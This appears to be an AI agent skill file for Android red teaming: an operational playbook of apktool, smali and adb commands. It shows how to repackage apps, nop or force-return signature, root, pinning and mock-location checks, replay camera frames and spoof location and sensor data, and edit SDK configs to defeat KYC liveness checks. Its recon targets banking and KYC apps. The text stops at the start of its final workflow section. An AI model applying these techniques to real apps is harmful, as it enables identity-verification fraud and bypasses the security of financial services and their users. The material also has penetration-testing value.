# Android Red Team & Reverse Engineering Skill

General-purpose Android application security testing, APK reverse engineering, smali patching, biometric/authentication bypass, asset manipulation, and anti-tamper evasion. For authorized penetration testing, CTF, and security research only.

---

## 1. APK Repackaging Pipeline

### Standard Flow
```
Original APK -> apktool decode -> modify smali/resources/assets -> apktool build -> zipalign -> apksigner
```

### Commands
```bash
# Decode
apktool d target.apk -o decoded/ -f

# Build
apktool b decoded/ -o patched.apk

# Align (required before signing)
zipalign -f 4 patched.apk aligned.apk

# Sign (debug keystore)
keytool -genkeypair -v -keystore debug.keystore \
  -alias poc -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass poctest123 -keypass poctest123 \
  -dname "CN=PoC,O=SecurityAudit"

apksigner sign \
  --ks debug.keystore --ks-key-alias poc \
  --ks-pass pass:poctest123 --key-pass pass:poctest123 \
  aligned.apk
```

### APK Signing Schemes
| Scheme | API Level | Notes |
|--------|-----------|-------|
| v1 (JAR signing) | All | Signs individual ZIP entries. Weakest. |
| v2 (APK Signature Scheme v2) | 24+ (Android 7.0) | Signs entire APK as binary blob. |
| v3 (APK Signature Scheme v3) | 28+ (Android 9.0) | Adds key rotation support. |
| v4 (Incremental signing) | 30+ (Android 11) | Streaming installation. |

Re-signing with a debug key means: (1) must uninstall before install (signature mismatch), (2) apps with signature verification will detect re-signing, (3) fine for emulators and dev devices.

### Tools Required
- `apktool` -- APK decode/rebuild (`brew install apktool`)
- `zipalign` -- APK alignment (Android SDK build-tools)
- `apksigner` -- APK signing (Android SDK build-tools)
- `adb` -- device communication (Android SDK platform-tools)
- `jadx` / `jadx-gui` -- Java decompilation for analysis
- `dex2jar` + `jd-gui` -- alternative decompilation path

### Build Tools Auto-Detection (macOS)
```bash
if [ -d "$HOME/Library/Android/sdk/build-tools" ]; then
    BUILD_TOOLS=$(ls -d "$HOME/Library/Android/sdk/build-tools"/*/ | sort -V | tail -1)
elif [ -n "${ANDROID_HOME:-}" ]; then
    BUILD_TOOLS=$(ls -d "$ANDROID_HOME/build-tools"/*/ | sort -V | tail -1)
fi
ZIPALIGN="${BUILD_TOOLS}zipalign"
APKSIGNER="${BUILD_TOOLS}apksigner"
```

---

## 2. APK Anatomy & Android Internals

### APK Structure
```text
app.apk
  AndroidManifest.xml     <- app configuration, permissions, entry points
  classes.dex             <- compiled bytecode (primary)
  classes2.dex            <- additional bytecode (multidex)
  classes3.dex            <- more bytecode (as needed)
  res/                    <- compiled resources (layouts, drawables, etc.)
  assets/                 <- raw assets (config files, ML models, etc.)
  lib/                    <- native libraries (.so files, per architecture)
  META-INF/               <- signature files
  resources.arsc          <- compiled resource table
```

### DEX Format & Multidex
- Single DEX: max 65,536 methods (64K limit)
- Most apps split across `classes.dex` through `classesN.dex`
- ART loads ALL classesN.dex into the same classloader namespace
- **Injection vector:** Add a new DEX (e.g., `classes7.dex`) -- the classloader treats injected classes as part of the app

### Compilation Chain
```text
Java/Kotlin (.java/.kt)
  -> Java Bytecode (.class) [javac/kotlinc]
  -> DEX Bytecode (.dex) [d8/r8]
  -> Smali text (.smali) [apktool/baksmali]
```

### The Three Interception Patterns
1. **Method Entry Interception** -- insert code at method start, modify/replace parameters before body runs
2. **Return Value Replacement** -- replace entire method body with constant return (e.g., `return true`)
3. **Call-Site Interception** -- modify the caller to replace arguments or return values around a specific API call

### Application Lifecycle & Hook Bootstrap
```text
Process creation -> Application class instantiation -> Application.onCreate() -> Activity creation
```
Hook bootstrap fires in `Application.onCreate()` -- earliest app-level code. All interceptors arm before any Activity starts.

---

## 3. Reconnaissance Methodology

### APK Acquisition
```bash
# Find installed packages
adb shell pm list packages | grep -iE "bank|finance|verify|kyc"

# Get APK path
adb shell pm path <package>

# Pull APK from device
adb pull <path> target.apk

# Handle split APKs
adb shell pm path <package>  # shows base.apk + splits
adb pull /data/app/<package>/base.apk ./target.apk
```

### Decoding & Manifest Analysis
```bash
# Decode
apktool d target.apk -o decoded/ -f

# Identify Application class (bootstrap hook point)
grep 'android:name' decoded/AndroidManifest.xml | head -5

# List permissions (attack surface indicators)
grep 'uses-permission' decoded/AndroidManifest.xml

# Find exported Activities
grep -B2 'exported="true"' decoded/AndroidManifest.xml
```

### Camera API Identification
```bash
# CameraX (modern, most common)
grep -rn "ImageAnalysis\|ImageProxy\|CameraX" decoded/smali*/

# Camera2 (older, fine-grained control)
grep -rn "CameraDevice\|CameraCaptureSession\|ImageReader" decoded/smali*/
```

### Location & Sensor Surface Mapping
```bash
# Location callbacks
grep -rn "onLocationResult\|onLocationChanged\|getLastLocation\|FusedLocation" decoded/smali*/

# Mock location detection
grep -rn "isFromMockProvider\|isMock\|mock_location" decoded/smali*/

# Sensor listeners
grep -rn "onSensorChanged\|SensorEventListener\|TYPE_ACCELEROMETER\|TYPE_GYROSCOPE" decoded/smali*/
```

### Asset & Config Inventory
```bash
# List all assets
find decoded/assets/ -type f | head -30

# Find JSON configs
find decoded/assets/ decoded/res/raw/ -name "*.json" 2>/dev/null

# Find ML models
find decoded/assets/ decoded/res/raw/ \
  -name "*.tflite" -o -name "*.onnx" -o -name "*.pt" -o -name "*.mlmodel" 2>/dev/null

# Find Firebase Remote Config defaults
cat decoded/res/xml/remote_config_defaults.xml 2>/dev/null

# Find properties/config files
find decoded/assets/ decoded/res/raw/ \
  -name "*.properties" -o -name "*.cfg" -o -name "*.conf" -o -name "*.yaml" 2>/dev/null

# Search strings.xml for API keys, endpoints, geofence params
grep -iE "api|key|url|endpoint|secret|threshold|token" decoded/res/values/strings.xml
```

### SDK Identification
```bash
# Third-party SDK packages
ls decoded/smali*/com/
ls decoded/smali*/io/

# Common liveness/KYC SDKs
grep -rn "facetec\|iproov\|jumio\|onfido\|regula\|daon\|aware" decoded/smali*/
```

### Integrity Check Recon
```bash
# Signature verification
grep -rn "getPackageInfo" decoded/smali*/
grep -rn "GET_SIGNATURES\|GET_SIGNING_CERTIFICATES" decoded/smali*/
grep -rn "MessageDigest" decoded/smali*/

# DEX integrity
grep -rn "classes\.dex" decoded/smali*/
grep -rn "getCrc\|getChecksum\|ZipEntry" decoded/smali*/

# Installer verification
grep -rn "getInstallingPackageName\|getInstallSourceInfo" decoded/smali*/
grep -rn "com\.android\.vending" decoded/smali*/

# Root/emulator detection
grep -rn "su\b\|/system/xbin\|Superuser\|magisk" decoded/smali*/
grep -rn "Build\.FINGERPRINT\|Build\.MODEL\|goldfish\|sdk_gphone" decoded/smali*/

# Certificate pinning
grep -rn "CertificatePinner" decoded/smali*/
grep -rn "network_security_config" decoded/AndroidManifest.xml
```

---

## 4. Smali Patching -- Rules & Best Practices

### Golden Rules
1. **Use file replacement (`cp`), not `sed` injection** for complex patches. `sed` on multi-line smali is fragile and causes register type conflicts.
2. **Pre-verify all patched smali files** in a `smali-patches/` directory. Copy them in during the build.
3. **Keep `.locals` directive >= highest register number** used in the method.
4. **Always bump `.locals`, not `.registers`** -- incrementing `.registers` shifts parameter register assignments and silently breaks existing code.
5. **Test on a real device after every smali change** -- the Dalvik verifier catches type mismatches that static analysis misses.
6. **Never overwrite registers that are used later** in the same basic block.
7. **Register types don't persist across branch merge points** -- the verifier checks all paths to a merge point and rejects if types conflict.

### Common VerifyError Causes
| Symptom | Cause | Fix |
|---------|-------|-----|
| `register vN has type Undefined but expected Reference` | Code path where register is never assigned | Ensure register is assigned on ALL paths to the use point |
| `register vN has type Integer but expected Reference` | Reused register for incompatible types at merge point | Use different registers or restructure branches |
| `VFY: rejecting opcode` | Invalid instruction for the register type | Check `.locals` count, verify register assignments |

### Smali Cheat Sheet
```smali
# Call a static method
invoke-static {v0}, Lcom/example/MyClass;->myMethod(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;
move-result-object v0

# Log a string
const-string v0, "TAG"
const-string v1, "message"
invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

# Create new instance
new-instance v0, Ljava/io/File;
const-string v1, "/sdcard/Download/test"
invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

# Check boolean and branch
invoke-virtual {v0}, Ljava/io/File;->exists()Z
move-result v1
if-eqz v1, :label_false

# Array operations
new-array v0, v1, [Ljava/lang/String;   # create String[] of size v1
const/4 v2, 0x0
aput-object v3, v0, v2                   # v0[0] = v3

# Type descriptors
# V=void, Z=boolean, I=int, J=long, F=float, D=double
# L...;=object, [=array prefix
# Landroid/graphics/Bitmap; = android.graphics.Bitmap
```

### Invoke Variants
| Instruction | When |
|-------------|------|
| `invoke-virtual` | Normal instance method call |
| `invoke-static` | Static method call (no `this`) |
| `invoke-interface` | Method on an interface reference |
| `invoke-direct` | Constructor or private method |

### Register System
- `p` registers = parameters. `p0` = `this` (instance methods), `p1` = first param, etc.
- `v` registers = local variables. `v0`, `v1`, etc.
- `.locals N` declares N local registers (params are additional)
- `.registers N` declares total registers (locals + params) -- **avoid using this**

### New Class Injection Pattern
```smali
.class public Lcom/example/target/package/MyInjectedClass;
.super Ljava/lang/Object;
.source ""

.field private static initialized:Z
.field private static data:Ljava/util/List;

.method public static myMethod(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;
    .locals 2
    # ... your code ...
    return-object p0
.end method
```
Place the new class in the same smali directory as the package you're targeting. Class path in `.class` directive must match directory structure.

---

## 5. The Three Hook Patterns

### Decision Tree
```text
Where is the data you want to intercept?
  -> Arrives as a method PARAMETER     -> Pattern 1: Method Entry
  -> Comes from a method CALL in body  -> Pattern 2: Call-Site
  -> Is RETURNED by this method        -> Pattern 3: Return Value
```

### Pattern 1: Method Entry Injection
Insert at top of method, right after `.locals`. Replace or modify parameters before body runs.

```smali
# Camera hook: replace ImageProxy parameter
.method public analyze(Landroidx/camera/core/ImageProxy;)V
    .registers 4
    invoke-static {p1}, Lcom/hookengine/core/FrameInterceptor;->intercept(Landroidx/camera/core/ImageProxy;)Landroidx/camera/core/ImageProxy;
    move-result-object p1
    # ... original code now uses FAKE ImageProxy
```

**Use cases:** Intercept incoming data -- ImageProxy, Location, SensorEvent. Log method entry for recon.

### Pattern 2: Call-Site Interception
Find a method call inside a method, insert after it to modify return value.

```smali
# Location hook: replace Location after getLastKnownLocation()
invoke-virtual {v3}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
move-result-object v4
invoke-static {v4}, Lcom/hookengine/core/LocationInterceptor;->interceptLocation(Landroid/location/Location;)Landroid/location/Location;
move-result-object v4
# v4 now holds FAKE Location
```

**Use cases:** Modify return values of system API calls. Log parameters of outgoing calls.

### Pattern 3: Return Value Replacement
Intercept value just before method returns.

```smali
# Bitmap hook: replace bitmap before return
invoke-virtual {v0}, Landroidx/camera/core/ImageProxy;->toBitmap()Landroid/graphics/Bitmap;
move-result-object v1
invoke-static {v1}, Lcom/hookengine/core/FrameInterceptor;->transform(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;
move-result-object v1
return-object v1
```

**Use cases:** Intercept computed results -- `toBitmap()`, auth tokens, config strings.

---

## 6. Hook Point Identification

### Strategy
1. **Decompile with jadx** to understand the Java/Kotlin flow
2. **Identify the data pipeline** -- where does sensitive data (frames, tokens, credentials) flow?
3. **Find the narrowest hook point** -- a single method where intercepting/modifying one value changes the outcome
4. **Map the register state** around the hook point in smali before patching

### Common Hook Targets
| Target | Where to Hook | What to Modify |
|--------|--------------|----------------|
| Camera frames | ImageAnalysis callback / `onImageAvailable` | Replace Bitmap with prepared image |
| Liveness check | Result mapping function | Force result to LIVE/PASSED |
| Certificate pinning | TrustManager / OkHttp CertificatePinner | Return without validation |
| Root detection | Detection utility methods | Return false/unrooted |
| API responses | Retrofit interceptor / OkHttp Interceptor | Modify response body |
| Biometric prompt | BiometricPrompt callback | Force SUCCESS result |
| Token validation | JWT/token verification methods | Skip signature check |
| Mock location | `isFromMockProvider()` / `isMock()` | Return false |
| Sensor data | `onSensorChanged(SensorEvent)` | Replace event values |

### Register Mapping Workflow
1. Open the target `.smali` file
2. Find the method signature
3. Note `.locals N` -- registers v0..v(N-1) plus parameters p0..pM
4. Trace each register assignment through the method
5. Identify "safe" registers (unused or reusable) at your hook point
6. Document the register map as comments

### Finding Hook Targets in Decoded APKs
```bash
# Classes implementing a specific interface
grep -r "implements Landroidx/camera/core/ImageAnalysis\$Analyzer;" decoded/smali*/

# All calls to a specific method
grep -rn "invoke-virtual.*getLastKnownLocation" decoded/smali*/

# All onSensorChanged implementations
grep -rn "\.method.*onSensorChanged" decoded/smali*/

# SharedPreferences.getString calls
grep -rn "invoke-interface.*SharedPreferences;->getString" decoded/smali*/

# WebView.loadUrl calls
grep -rn "invoke-virtual.*WebView;->loadUrl" decoded/smali*/

# Method boundaries in a specific class
grep -n "\.method\|\.end method\|\.registers\|\.locals" decoded/smali/com/example/TargetClass.smali
```

---

## 7. CameraX / Camera Pipeline Attacks

### CameraX ImageAnalysis Pipeline
```text
CameraX ImageAnalysis.Analyzer
    -> onAnalyze(ImageProxy)
        -> ImageProxy.toBitmap() -> Bitmap (often 320x240 or 640x480)
            -> [HOOK POINT: replace bitmap here]
        -> SDK processing (face detection, liveness, etc.)
```

### Camera2 Pipeline
```text
Camera2
    -> ImageReader.OnImageAvailableListener
        -> onImageAvailable(ImageReader)
            -> ImageReader.acquireLatestImage() -> Image
                -> [HOOK POINT: replace Image here]
```

### Frame Replay Attack Pattern
1. **Prepare frames**: Match exact resolution, format (ARGB_8888), and orientation
2. **Inject interceptor**: Hook after `toBitmap()` to swap real frame with prepared one
3. **Cycle through frames**: Feed sequentially to simulate natural movement
4. **Handle looping**: Loop back when frames exhausted

### Frame Specification Discovery
- Check `ImageAnalysis.Builder` configuration for target resolution
- Log bitmap dimensions after `toBitmap()` on an unmodified build
- Check bitmap config (ARGB_8888, RGB_565, etc.)
- Check if SDK applies rotation internally

### Frame Payload Delivery
```bash
# Push face frames
adb push ./face_frames/ /sdcard/poc_frames/face_neutral/

# Push document frames
adb push ./doc_frames/ /sdcard/poc_frames/document/

# Verify frames on device
adb shell ls -la /sdcard/poc_frames/
```

---

## 8. Location Spoofing

### Interception Points

**FusedLocationProviderClient (Modern API):**
```text
FusedLocationProviderClient
  -> LocationCallback.onLocationResult(LocationResult)    [HOOKED]
  -> getLastLocation() -> Task<Location>                  [HOOKED]
  -> getCurrentLocation() -> Task<Location>               [HOOKED]
```

**LocationManager (Legacy API):**
```text
LocationManager
  -> LocationListener.onLocationChanged(Location)         [HOOKED]
  -> getLastKnownLocation() -> Location                   [HOOKED]
```

### Mock Detection Bypass
| Check | API Level | Bypass |
|-------|-----------|--------|
| `Location.isFromMockProvider()` | API 18-30 | Patched at call site to return `false` |
| `Location.isMock()` | API 31+ | Patched at call site to return `false` |
| `Settings.Secure.getString("mock_location")` | All | Intercepted to return `"0"` |

These are **smali patches** applied during APK patching, not runtime intercepts.

### Config File
Push to `/sdcard/poc_location/config.json`:
```json
{
  "latitude": 40.7580,
  "longitude": -73.9855,
  "altitude": 5.0,
  "accuracy": 8.0,
  "speed": 0.0,
  "bearing": 0.0
}
```

### Fake Location Fields
| Field | Notes |
|-------|-------|
| Lat/Lng | From config |
| Accuracy | Jittered +/-2m per delivery for realism |
| Provider | Hardcoded `"fused"` |
| Timestamp | `System.currentTimeMillis()` -- always fresh |
| Elapsed realtime nanos | `SystemClock.elapsedRealtimeNanos()` |

### Hot-Reloading
Push new config while app runs. Interceptor re-reads every 2 seconds.

### Waypoint Routes (Continuous Monitoring)
```json
{
  "waypoints": [
    { "latitude": 40.7580, "longitude": -73.9855, "accuracy": 8.0, "delayMs": 0 },
    { "latitude": 40.7590, "longitude": -73.9850, "accuracy": 10.0, "delayMs": 5000 },
    { "latitude": 40.7600, "longitude": -73.9845, "accuracy": 9.0, "delayMs": 10000 }
  ]
}
```

### Extracting Geofence Coordinates
```bash
# Hardcoded in smali
grep -rn "latitude\|longitude\|LatLng\|geofence" decoded/smali*/
grep -rn "const.*40\.\|const.*37\.\|const.*51\." decoded/smali*/

# In string resources
grep -rn "latitude\|longitude" decoded/res/values/strings.xml
```

---

## 9. Sensor Injection

### Base Sensors (You Configure)
| Sensor | Type Constant | Unit |
|--------|---------------|------|
| Accelerometer | `TYPE_ACCELEROMETER` | m/s^2 |
| Gyroscope | `TYPE_GYROSCOPE` | rad/s |
| Magnetometer | `TYPE_MAGNETIC_FIELD` | uT |

### Derived Sensors (Computed Automatically)
| Sensor | Derived From |
|--------|-------------|
| Gravity | Accelerometer |
| Linear Acceleration | Accelerometer - Gravity |
| Rotation Vector | Accel + Magnetometer |
| Game Rotation Vector | Accel + Gyroscope |
| Step Counter/Detector | Accelerometer patterns |

### Cross-Sensor Consistency
All derived sensors flow from the same three base vectors. If an SDK cross-checks rotation vector against accelerometer, both are internally consistent. `sqrt(accelX^2 + accelY^2 + accelZ^2)` must always be approximately 9.81 m/s^2.

### Accelerometer Orientation
| Device Position | accelX | accelY | accelZ |
|---------------|--------|--------|--------|
| Flat, face up | 0.0 | 0.0 | 9.81 |
| Portrait, upright | 0.0 | 9.81 | 0.0 |
| Tilted 30 deg left | 4.9 | 0.0 | 8.5 |
| Tilted 30 deg right | -4.9 | 0.0 | 8.5 |

### Config File
Push to `/sdcard/poc_sensor/config.json`:
```json
{
  "accelX": 0.1, "accelY": 9.5, "accelZ": 2.5,
  "gyroX": 0.0, "gyroY": 0.0, "gyroZ": 0.0,
  "magX": 0.0, "magY": 25.0, "magZ": -45.0,
  "jitter": 0.15,
  "proximity": 5.0,
  "light": 300.0
}
```

### Pre-Built Profiles
| Profile | Use Case | Key Values |
|---------|----------|-----------|
| `holding.json` | Person holding phone (selfie) | accel=(0.1, 9.5, 2.5), jitter=0.15 |
| `still.json` | Phone on desk | accel=(0, 0, 9.81), jitter=0.05 |
| `tilt-left.json` | Active liveness: tilt left | accel=(3.0, 0, 9.31), gyroZ=-0.15 |
| `tilt-right.json` | Active liveness: tilt right | accel=(-3.0, 0, 9.31), gyroZ=0.15 |
| `nod.json` | Active liveness: nod down | accel=(0, 3.0, 9.31), gyroX=0.15 |

### Matching Sensors to Camera Frames
- **Passive liveness:** Use `holding.json`. Camera shows face, sensors show held phone.
- **Active liveness (tilt/nod):** Coordinate switching -- push tilt sensor config when camera frames show face tilting.
- **Static (document scan):** Use `still.json`.

---

## 10. Anti-Tamper Evasion

### Defense Landscape
| Defense | What It Detects | Frequency |
|---------|----------------|-----------|
| Signature verification | APK re-signed with different key | Very common |
| Certificate pinning | MITM on SDK API calls | Common |
| Root/emulator detection | Rooted device or emulator | Common |
| Installer verification | Sideloaded (not from Play Store) | Moderate |
| DEX integrity check | Modified classes.dex (CRC/hash) | Moderate |
| Debuggable flag | `android:debuggable=true` | Moderate |
| Frida/Xposed detection | Runtime hooking frameworks | Common (irrelevant to smali approach) |

### Defense Layering Patterns
- **Banking apps:** Signature verification -> Play Integrity -> Certificate pinning -> Root/emulator detection
- **KYC apps:** Signature verification -> DEX integrity -> Installer verification
- **Fintech:** Standard layer + commercial anti-tamper SDK (single `invoke-static` init call)
- **Key insight:** Defenses are sequenced. Neutralize in order -- if app dies at step 1, you never reach steps 2-4.

### Technique 1: Nop the Branch
```smali
# BEFORE: if signature doesn't match, call killApp()
if-nez v0, :signature_invalid

# AFTER: nop the branch -- check never triggers
nop
nop
```
**When to use:** Simple if/else, can identify failure branch.

### Technique 2: Force the Return Value
```smali
# BEFORE: 50 lines of checking logic
.method public static isSignatureValid(Landroid/content/Context;)Z
    .registers 8
    # ... complex logic ...
    return v5

# AFTER: always returns true
.method public static isSignatureValid(Landroid/content/Context;)Z
    .registers 1
    const/4 v0, 0x1
    return v0
.end method
```
**When to use:** Check in its own method. Default choice -- handles 60-70% of cases.

### Technique 3: Patch the Expected Value
```bash
# Get your debug keystore's signature hash
keytool -exportcert -keystore ~/.android/debug.keystore \
  -alias androiddebugkey | openssl dgst -sha256 -hex
```
```smali
# Find the hardcoded hash and replace with yours
const-string v3, "yZ9w...yourDebugHash..."
```
**When to use:** Stealth option. Check still runs but validates YOUR key. Server sees passing check.

### Technique 4: Remove SDK Initialization
```smali
# Find:
invoke-static {p0}, Lcom/security/sdk/IntegrityCheck;->init(Landroid/content/Context;)V
# Replace with:
nop
```
**When to use:** Third-party anti-tamper SDK with clear entry point.

### Technique 5: Certificate Pinning Bypass

**Option A: Patch `network_security_config.xml`**
```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
```

**Option B: Nop the CertificatePinner**
Find `CertificatePinner.check()` or `CertificatePinner$Builder.add()` calls and nop them.

### Decision Flowchart
```text
Can you identify the check method by name?
  YES -> Is return value boolean? -> YES -> Technique 2 (Force Return)
                                  -> NO  -> Calls exit/kill? -> Technique 1 (Nop kill)
  NO  -> Can you find conditional branch to failure? -> YES -> Technique 1 (Nop Branch)
      -> Comparing hardcoded hash? -> YES -> Technique 3 (Patch Expected Value)
      -> SDK init call? -> YES -> Technique 4 (Nop Init)
      -> Certificate pinning? -> YES -> Technique 5
      -> None above -> Trace call chain, apply Technique 1 or 2 at consumption point
```

---

## 11. Native Code (JNI) Defenses

### Recon for Native Methods
```bash
# Find native method declarations in smali
grep -rn "\.method.*native" decoded/smali*/

# Find System.loadLibrary calls
grep -rn "loadLibrary\|System\.load" decoded/smali*/

# List native libraries in APK
ls decoded/lib/*/
```

### The JNI Bridge
```text
Java/Kotlin (smali) --[JNI bridge]--> Native (.so)
         ^
         |
   [CUT HERE -- 80-90% of cases]
```

Native checks return a boolean or result to the managed layer. The JNI bridge is a regular `native` method in smali -- intercept the return value on the managed side without touching the `.so`.

### Three Approaches
1. **Cut at JNI bridge (preferred):** Force-return on the native method declaration in smali
2. **Patch .so binary:** Use Ghidra/IDA to find check function, patch ARM64 instructions
3. **Delete the library:** Remove from `lib/` if app has fallback path

### ARM64 Patch Example (Ghidra)
```asm
; Original: complex validation returning 0 on failure
; Patched: always return 1 (true)
mov w0, #1
ret
; Hex: 20 00 80 52 C0 03 5F D6
```

---

## 12. Attacking Unprotected App Assets

### Asset Types
| File Type | Location | What It Controls |
|-----------|---------|-----------------|
| `.tflite` | `assets/face_detection.tflite` | On-device ML model |
| `.json` | `assets/sdk_config.json` | SDK params, thresholds, flags |
| `.xml` | `res/xml/remote_config_defaults.xml` | Firebase Remote Config defaults |
| `.properties` | `assets/app.properties` | API endpoints, debug flags |
| `.json` | `assets/geofence.json` | Geofence coordinates, radius |

### JSON Config Manipulation
```bash
python3 -c "
import json
with open('decoded/assets/sdk_config.json', 'r') as f:
    config = json.load(f)
config['liveness_threshold'] = 0.01
config['anti_spoof_enabled'] = False
config['debug_mode'] = True
with open('decoded/assets/sdk_config.json', 'w') as f:
    json.dump(config, f, indent=2)
"
```

| Modification | Effect |
|-------------|--------|
| `"liveness_threshold": 0.01` | Almost any input passes |
| `"anti_spoof_enabled": false` | Disables anti-spoofing model |
| `"require_blink": false` | Removes blink challenge |
| `"debug_mode": true` | May skip checks, enable logging |
| `"mock_detection_enabled": false` | Disables mock location detection |
| `"max_retries": 999` | Unlimited attempts |

### ML Model Replacement
```bash
# Find model loading code
grep -rn "loadModel\|Interpreter\|tflite\|onnx" decoded/smali*/

# Inspect tensor shapes
python3 -c "
import tensorflow as tf
interpreter = tf.lite.Interpreter(model_path='decoded/assets/face_detection.tflite')
interpreter.allocate_tensors()
print('Input:', interpreter.get_input_details())
print('Output:', interpreter.get_output_details())
"
```

Three vectors: (1) Replace with permissive model, (2) Replace with no-op model (must match tensor shapes), (3) Downgrade to weaker variant.

### Firebase Remote Config Defaults
Edit `decoded/res/xml/remote_config_defaults.xml` -- change `<value>true</value>` to `<value>false</value>` for checks you want to disable. Applies when device is offline or before first fetch.

### SharedPreferences Defaults
```bash
find decoded/res/xml/ -name "*prefer*" -o -name "*settings*" -o -name "*config*" 2>/dev/null
```
Change `android:defaultValue="true"` to `"false"`. May need `adb shell pm clear <package>` for new defaults to take effect.

### Encrypted Assets
```bash
# Find decryption logic
grep -rn "Cipher\|SecretKey\|AES\|decrypt\|Base64\.decode" decoded/smali*/
grep -rn "AssetManager\|openRawResource\|getAssets" decoded/smali*/
```
Options: (1) Decrypt, modify, re-encrypt. (2) Replace encrypted file with plaintext and nop decryption call. (3) Hook the decryption output.

### Edit-Rebuild-Resign Workflow (Assets)
```bash
# 1. Decode
apktool d target.apk -o decoded/

# 2. Edit assets in place
vi decoded/assets/sdk_config.json
cp my_model.tflite decoded/assets/face_detection.tflite

# 3. Rebuild
apktool b decoded/ -o modified.apk

# 4. Align
zipalign -f 4 modified.apk aligned.apk

# 5. Sign
apksigner sign --ks debug.keystore --ks-key-alias poc \
  --ks-pass pass:poctest123 aligned.apk

# 6. Install
adb uninstall com.target.package 2>/dev/null
adb install aligned.apk
```

**Combining with patch-tool:** Edit assets and smali first, rebuild, THEN run patch-tool against the rebuilt APK. The patch-tool preserves asset modifications.

---

## 13. Liveness Detection Bypass Patterns

### Client-Side Liveness (easiest)
1. Find result mapping function (e.g., `getAsLivenessVerdict()`, `mapLivenessResult()`)
2. Force it to return the "live" enum value
3. Server trusts client-reported verdict

### Signs of Client-Side Liveness
- Enum values like `LIVE`, `INDET`, `SPOOF` in SDK code
- Mapping function converting native/JNI results to enum
- Server-bound payload includes liveness field set by client

### Server-Side Liveness (harder)
- Frame quality: ensure natural variation (slight movement, lighting changes)
- Timing: feed frames at realistic intervals (~30ms = 30fps)
- Multiple angles: prepare frames showing face at different angles
- Sensor correlation: match sensor profiles to camera frame sequences

---

## 14. NFC & Passport Chip Reading

### ICAO Doc 9303 Data Groups
| DG | Content | Security Use |
|----|---------|-------------|
| DG1 | MRZ data (name, DOB, passport number) | Identity binding |
| DG2 | Face photograph (JPEG2000 or JPEG) | Biometric comparison |
| DG3 | Fingerprints (if stored) | Biometric comparison |
| DG14 | Security mechanisms (Chip Authentication) | Active authentication |
| SOD | Document Security Object (signed hash of all DGs) | Passive authentication |

### Authentication Protocols
- **BAC (Basic Access Control):** Uses MRZ data (doc number + DOB + expiry) as key. Symmetric.
- **PACE (Password Authenticated Connection Establishment):** Modern replacement for BAC. Elliptic curve.

### Android NFC Stack
```text
NFC Hardware -> NfcAdapter -> IsoDep.transceive(APDU) -> e-Passport chip
```

### Recon for NFC
```bash
grep -rn "IsoDep\|NfcAdapter\|jmrtd\|PassportService" decoded/smali*/
grep -rn "TAG_DISCOVERED\|TECH_DISCOVERED" decoded/AndroidManifest.xml
```

---

## 15. Multi-DEX APK Navigation

### Finding Target Classes
```bash
# Find which smali directory contains a package
for d in decoded/smali_classes*/com/target; do
    [ -d "$d" ] && echo "Found in: $(dirname $(dirname $d))"
done

# Search for a class across all smali directories
find decoded/ -name "TargetClass.smali" -type f

# Search for a method call across all smali
grep -r "invoke-.*TargetMethod" decoded/smali_classes*/
```

---

## 16. Android Permissions for PoC Work

### Storage Access
```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

### Granting Permissions via ADB
```bash
# Runtime permissions
adb shell pm grant <package> android.permission.CAMERA
adb shell pm grant <package> android.permission.ACCESS_FINE_LOCATION
adb shell pm grant <package> android.permission.READ_EXTERNAL_STORAGE

# Special permissions (requires appops)
adb shell appops set <package> MANAGE_EXTERNAL_STORAGE allow
```

### Removing FLAG_SECURE (allows screenshots/recording)
```smali
invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;
move-result-object v0
const/16 v1, 0x2000
invoke-virtual {v0, v1}, Landroid/view/Window;->clearFlags(I)V
```

---

## 17. Device Interaction

### Install & Setup
```bash
adb install -r patched-aligned.apk
adb shell appops set <package> MANAGE_EXTERNAL_STORAGE allow
adb push ./test-data/ /sdcard/poc_frames/
adb shell pm clear <package>
```

### Monitoring
```bash
adb logcat -s "HookEngine:*" "FrameInterceptor:*" "LocationInterceptor:*" "SensorInterceptor:*"
adb shell screenrecord /sdcard/recording.mp4
adb pull /sdcard/Download/output/ ./local-output/
```

### Package Discovery
```bash
adb shell pm list packages | grep -i target
adb shell pm path <package>
adb pull /data/app/<package>/base.apk ./target.apk
```

### Verification Checks
```bash
# Check hooks initialized
adb logcat -d -s HookEngine | tail -5

# Check payloads on device
adb shell ls -la /sdcard/poc_frames/
adb shell ls -la /sdcard/poc_location/
adb shell ls -la /sdcard/poc_sensor/

# Check permissions
adb shell dumpsys package <package> | grep -A 20 "granted=true"

# Get crash trace
adb logcat -d | grep -A 30 "FATAL EXCEPTION" | head -40
```

---

## 18. Obfuscation Handling

### What ProGuard/R8 Changes
- Class names: `com.bank.security.FaceVerifier` -> `a.b.c`
- Method names: `verifyFace()` -> `a()`
- Field names: `authToken` -> `a`
- String literals: **Usually preserved** (primary navigation aid)

### What ProGuard/R8 Never Changes
- **Android framework API calls** -- `WebView.loadUrl()`, `SharedPreferences.getString()`, etc.
- **Interface implementations** -- `ImageAnalysis.Analyzer.analyze()` retains name
- **Library method signatures** -- CameraX, Play Services, OkHttp APIs

### Working Around Obfuscation
```bash
# Match on framework API signatures, not app class names
grep -rn "invoke-interface.*ImageAnalysis\$Analyzer" decoded/smali*/

# Search by method signature shape
grep -rn "\.method.*\(Ljava/lang/String;\)Z" decoded/smali*/

# Follow string constants
grep -rn "session_token\|auth_token" decoded/smali*/

# Check for mapping file
unzip -l target.apk | grep -i mapping
```

---

## 19. Full Engagement Workflow

### Four Phases
1. **Recon:** Pull APK, decode, map all surfaces (camera, location, sensor, assets, defenses)
